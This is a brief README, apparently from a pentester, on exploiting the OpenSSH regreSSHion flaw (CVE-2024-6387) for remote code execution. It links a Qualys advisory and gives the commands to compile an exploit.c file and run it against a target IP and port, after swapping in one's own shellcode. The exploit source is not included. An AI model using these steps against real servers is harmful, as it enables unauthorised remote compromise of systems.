**Exploitation of regreSSHion (CVE-2024-6387) for RCE in a pentest**

https://blog.qualys.com/vulnerabilities-threat-research/2024/07/01/regresshion-remote-unauthenticated-code-execution-vulnerability-in-openssh-server#detect-and-remediate-cve-2024-6387-with-qualys-totalcloud-container-security

FIrst:

Replace the shellcode with yours to run  

It's been fixed for the client of course. :stuck_out_tongue_closed_eyes:

Run this:

``` shell
gcc -o regreSSHion exploit.c -lpthread

```

Then run this:

``` shell

./regreSSHion <target_ip> <target_port>

```
